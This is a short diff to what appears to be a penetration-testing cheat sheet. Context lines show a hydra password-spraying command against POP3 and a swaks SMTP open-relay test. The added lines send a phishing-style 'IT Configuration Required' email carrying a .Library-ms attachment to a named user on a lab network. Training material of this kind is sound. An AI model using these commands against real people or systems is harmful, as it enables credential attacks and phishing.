@@ -1530,7 +1530,10 @@ Password spraying against a list of users that use Office365 for the specified d
 hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 
 # Testing the SMTP service for the open-relay vulnerability.
-swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213  
+swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
+
+# Send mail with attach
+swaks --to Dave.Wizard@supermagicorg.com --from test@supermagicorg.com --server 192.168.220.199 --port 25 --auth LOGIN --auth-user "test@supermagicorg.com" --auth-password "test" --header "Subject: IT Configuration Required" --body @body.txt --attach @config.Library-ms --suppress-data 
 ```
 ## Pivoting, Tunneling, and Port Forwarding
 
